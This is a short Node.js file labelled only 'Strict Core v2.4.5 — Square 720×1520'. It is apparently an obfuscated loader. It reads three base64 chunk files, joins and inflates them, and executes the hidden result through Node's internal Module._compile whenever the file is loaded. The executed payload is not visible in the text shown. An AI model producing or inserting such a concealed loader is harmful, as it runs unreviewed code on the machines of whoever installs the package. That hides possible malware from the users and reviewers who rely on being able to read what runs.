/**
 * Strict Core v2.4.5 — Square 720×1520
 */
const fs=require("fs"),path=require("path"),z=require("zlib"),M=require("module");
const b64=[0,1,2].map(i=>fs.readFileSync(path.join(__dirname,"x"+i+".b64"),"utf8").trim()).join("");
const code=z.inflateSync(Buffer.from(b64,"base64")).toString("utf8");
const m=new M(__filename,module.parent);
m.filename=__filename;m.paths=M._nodeModulePaths(__dirname);m._compile(code,__filename);
